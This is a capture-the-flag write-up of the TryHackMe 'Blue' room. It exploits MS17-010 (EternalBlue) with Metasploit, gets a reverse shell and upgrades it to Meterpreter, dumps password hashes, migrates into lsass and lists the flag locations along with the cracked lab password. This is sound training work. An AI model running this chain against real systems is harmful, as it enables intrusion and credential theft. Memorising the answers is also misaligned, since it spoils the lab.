# Blue Writeup

## Room Information

**Platform:** TryHackMe  
**Room:** Blue  
**Difficulty:** Easy  

## Objective

The objective of this room is to identify a vulnerable Windows machine, exploit the **MS17-010 (EternalBlue)** SMB vulnerability, obtain a shell, upgrade it to a Meterpreter session, dump password hashes, and retrieve the required flags.

---

# Reconnaissance / Enumeration

The first step was to scan the target machine to identify open ports, running services, and possible vulnerabilities.

```bash
nmap -sC -sV -vv --script vuln -oN blue.nmap MACHINE_IP
```

The scan revealed the following open ports:

* **135 (MSRPC)** → Microsoft Windows RPC
* **139 (NetBIOS-SSN)** → NetBIOS session service
* **445 (Microsoft-DS / SMB)** → SMB file sharing service
* **3389 (RDP)** → Remote Desktop Protocol
* **49152, 49153, 49154, 49160 (MSRPC)** → Additional Microsoft RPC services

The scan also identified the target as a Windows machine:

* **Host:** `JON-PC`
* **OS:** `Windows 7 - 10`
* **Workgroup:** `WORKGROUP`

Most importantly, the Nmap vulnerability scripts confirmed that the machine was vulnerable to **MS17-010**:

```text
smb-vuln-ms17-010:
VULNERABLE:
Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
State: VULNERABLE
```

This confirmed that the system was affected by the well-known **EternalBlue** SMB vulnerability.

---

# Vulnerability Identification

The target was identified as vulnerable to:

```text
ms17-010
```

This is the well-known **EternalBlue** SMB vulnerability affecting older Windows systems.

---

# Exploitation

Metasploit was used to exploit the SMB vulnerability.

```bash
msfconsole
```

The EternalBlue exploit module was selected:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

The required target value was set:

```bash
set RHOSTS MACHINE_IP
```

A reverse shell payload was configured and the exploit was executed.

Initially, exploitation failed because the wrong local callback address was used. The listener was first configured with the local `eth0` address, which prevented the reverse connection from reaching the attacker machine through the VPN tunnel.

After correcting `LHOST` to the `tun0` VPN address, exploitation succeeded.

---

# Initial Access

Once the exploit succeeded, a Meterpreter session was obtained on the target Windows machine.

The target system information indicated:

* **Computer:** `JON-PC`
* **OS:** `Windows 7 (6.1 Build 7601, Service Pack 1)`
* **Architecture:** `x64`
* **Domain:** `WORKGROUP`

This confirmed successful exploitation of a vulnerable Windows 7 host.

---

# Shell Upgrade / Session Handling

During exploitation and post-exploitation, an initial session was established and then a Meterpreter session was used for further actions.

The following post module can be used to convert a shell into Meterpreter:

```text
post/multi/manage/shell_to_meterpreter
```

The required option in that step is:

```text
SESSION
```

After selecting the appropriate session and running the module, a Meterpreter session was successfully opened.

---

# Privilege Verification

Inside the Meterpreter session, privileges were verified:

```bash
getuid
```

This returned:

```text
NT AUTHORITY\SYSTEM
```

This confirmed that the session had **SYSTEM-level privileges**, giving full administrative control over the machine.

---

# Hash Dumping

With SYSTEM privileges available, password hashes were dumped from the target:

```bash
hashdump
```

The output included the built-in accounts and one non-default user:

```text
Jon
```

The recovered password for this user was:

```text
alqfna22
```

---

# Process Inspection and Migration

The running processes were listed using:

```bash
ps
```

A stable SYSTEM process was identified for migration. One suitable example was:

```text
724 - lsass.exe
```

Migrating into a stable SYSTEM process helps improve session reliability during post-exploitation.

---

# Flag 1

The first flag was found in the system root:

```cmd
C:\flag1.txt
```


---

# Flag 2

The second flag was located in the Windows configuration directory:

```cmd
C:\Windows\System32\config\flag2.txt
```


---

# Flag 3

The third flag was found in the user documents directory:

```cmd
C:\Users\Jon\Documents\flag3.txt
```


---

# Tools Used

* Nmap
* Metasploit Framework
* Meterpreter
* Windows Command Shell
* Linux Commands

---

# Lessons Learned

This room demonstrates a classic Windows exploitation chain using a well-known SMB vulnerability.

Key techniques practiced:

* Detailed service enumeration with **Nmap**
* Vulnerability detection using **Nmap NSE scripts**
* Identifying the **MS17-010 / EternalBlue** vulnerability
* Exploiting SMB with **Metasploit**
* Handling reverse connections correctly using the VPN tunnel interface
* Working with **Meterpreter**
* Verifying **SYSTEM** privileges
* Dumping password hashes
* Inspecting and migrating processes
* Retrieving flags from sensitive Windows locations

This challenge highlights how dangerous unpatched SMB vulnerabilities can be and how a single exposed service can lead to full system compromise.

---

